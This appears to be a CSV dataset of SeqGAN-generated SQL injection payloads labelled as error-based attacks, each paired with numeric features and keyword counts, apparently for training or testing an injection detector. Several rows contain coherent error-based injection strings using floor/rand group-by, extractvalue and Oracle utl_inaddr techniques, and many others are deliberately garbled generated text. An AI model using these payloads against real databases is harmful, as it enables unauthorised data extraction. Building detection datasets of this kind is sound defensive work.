label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1'||  (  select 'Nvgayywun6236a.r  (  having,le  113  (  )    thenchr  =a union group and  ||cxtjunuapar  selectnt  rand  select else  )  ,0x717a767a712in   113  ,concat  case whenz)     select  h from   ((  thenR 0 AND union or d x  selectAND from from )   or FROM    *.chr  (  113  ||chr  ""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""r  3440  )0x717a767a71   FROM   thenIS endin 5584 end,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,10,652.0,54.0,4.345180430618619,280.0,96.0,215.0,61.0,0.4294478527607362,0.147239263803681,0.32975460122699385,0.09355828220858896,2.0,2.0,0.0,0.0,3.0,2.0,0.0,33.0,0.0,0.0,10.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,5.0,0.0,6.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,28.0
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'qo'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,11,237.0,31.0,3.6294454884782428,71.0,37.0,100.0,29.0,0.29957805907172996,0.15611814345991562,0.4219409282700422,0.12236286919831224,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1'||  (  select 'Uvojyun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,12,24.0,17.0,3.8512274809529554,13.0,1.0,5.0,5.0,0.5416666666666666,0.041666666666666664,0.20833333333333334,0.20833333333333334,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1 AND0,1 3785 7158  113   then end  ||chr  (  ||chr  (  select by end  >  )    (  6825 FROM  6237,  0  )   )    )--  )     x 1210  )   --   ,0x717a767a71  )   then from  1   information_schemai  =  ) )     4386,0x717a767a71a)   )    )      (  )    SELECT Z 1 by 0 106  case1adtt_rNrox where 4607 ANDE  =  un   )     )     )  ,  >  ||cu  =  *2   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,13,345.0,51.0,4.0450207593024,100.0,61.0,141.0,43.0,0.2898550724637681,0.17681159420289855,0.40869565217391307,0.1246376811594203,0.0,0.0,4.0,0.0,1.0,3.0,0.0,20.0,0.0,2.0,5.0,16.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,14,305.0,39.0,4.0126707834767465,105.0,55.0,111.0,34.0,0.3442622950819672,0.18032786885245902,0.3639344262295082,0.11147540983606558,2.0,2.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-6055to_rjl  FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,15,18.0,16.0,3.94770277922009,9.0,4.0,3.0,2.0,0.5,0.2222222222222222,0.16666666666666666,0.1111111111111111,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""jyzn1210na   (  ,  select from  113  ||chr  (  ||chr  (  (  0,1   )   from   )  )   113     )    (       ,  ,0x717a767a713326  112  1as x or  x  )   x  )     thenthen by end  6055  =  *2   )   SELECT information_schema  5840  )   select union 1 ore_dr.(  (  = (  ||chr  (  ||chrconcat  (    alereabart 7881 AND 1  (  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,16,519.0,49.0,3.861371493217732,159.0,76.0,218.0,66.0,0.3063583815028902,0.1464354527938343,0.42003853564547206,0.12716763005780346,0.0,2.0,0.0,0.0,2.0,3.0,0.0,37.0,0.0,2.0,8.0,15.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,0.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"11""O",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,17,4.0,3.0,1.5,1.0,2.0,0.0,1.0,0.25,0.5,0.0,0.25,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'b6270To""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'jp3775' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'_  =  ||chr  (  (  ||chr  (  =  r  '   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ' and  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,18,1393.0,47.0,3.9747349715265914,428.0,239.0,544.0,182.0,0.3072505384063173,0.1715721464465183,0.3905240488155061,0.1306532663316583,8.0,2.0,0.0,0.0,4.0,10.0,0.0,102.0,0.0,4.0,22.0,42.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,15.0,6.0,1.0,4.0,7.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,39.0
attack,"1""7469  4232  5023, 3440  )   x0x717a767a71,floor  =  a,      (  ||chr  (  ,0x717a767a71un or 4386  4493  --  )     thenIT(  0  >  floor  e  uayssx.gs LINUEe  (   7469  ||chr  (  )   (  SELECT else concat  (  ||chr  (  =  )  case ||  (  (  ~  )   )    or 1 when SELECT then else 1x when   then (  *  select    4607    )   from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19,326.0,47.0,4.15657684929557,111.0,54.0,122.0,39.0,0.34049079754601225,0.1656441717791411,0.37423312883435583,0.1196319018404908,0.0,1.0,2.0,0.0,1.0,2.0,0.0,18.0,0.0,0.0,4.0,14.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%-T  = 4510  =  ,  0  (  )   )       x   xup from ,1a where andhr  FROM=  (  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20,79.0,30.0,3.5647685638933857,24.0,7.0,36.0,12.0,0.3037974683544304,0.08860759493670886,0.45569620253164556,0.1518987341772152,0.0,0.0,1.0,0.0,0.0,3.0,0.0,4.0,1.0,0.0,2.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""58400x7171706a71,2_drts.r  (  =  )   ,0x717a767a71nr  SELECT DISNNhr  r  casechr  (  =  ,,floor  (    )  ||chr  (  (  select hr  (  113  >  4232  113  =  )  SELECT  1 DIINNCTM 1INCT  (  1045,1   2nt  (  chr  chr  rand  ||chr  (  case when   (  ||r  -(  )  (     6825)   )   )     )  union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21,489.0,50.0,3.930442322115868,142.0,78.0,203.0,66.0,0.2903885480572597,0.15950920245398773,0.41513292433537835,0.13496932515337423,0.0,2.0,1.0,0.0,1.0,4.0,0.0,38.0,1.0,1.0,9.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"-3775o  113  ,floor  (  (     )  ||chr  ||rr  (hr  t  6825  4232  case )   )  =    ,floor  (  ANDfounu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22,102.0,30.0,3.71459463406317,31.0,15.0,41.0,15.0,0.30392156862745096,0.14705882352941177,0.4019607843137255,0.14705882352941177,0.0,0.0,1.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,2.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'a x group concat  3440  ||Ech0x717a767a71.gTehr  t  (  (  select  AcU  ,1   fromIx.cShr  (  8190  )1392T  4386  (  ||chr  0x7171706a71,1  *2   )    2131x dr   (  0   concat  ||U.counr  (  )    having elseINSONne LIvudnthr  (  0x7171706a71  )  ||chr  tr  (  (  case 113  113  case wheniaNC else WHERE by",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23,521.0,55.0,4.268950160709676,194.0,96.0,179.0,52.0,0.3723608445297505,0.18426103646833014,0.3435700575815739,0.09980806142034548,1.0,2.0,0.0,0.0,1.0,1.0,0.0,29.0,0.0,0.0,7.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'i  4386  )     )    )   or )     106  ||crounaxesAsselect  Dx mx  )     )   --2e end   )    (  ,0x717a767a71,0x717a767a71 from dur  (  )  )    )   x union 0 1x   )   )   thenx when where end  )   x ayCT  )     )   )  =a  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24,224.0,38.0,3.6277569544217307,71.0,29.0,97.0,27.0,0.3169642857142857,0.12946428571428573,0.4330357142857143,0.12053571428571429,1.0,0.0,2.0,0.0,0.0,1.0,0.0,19.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
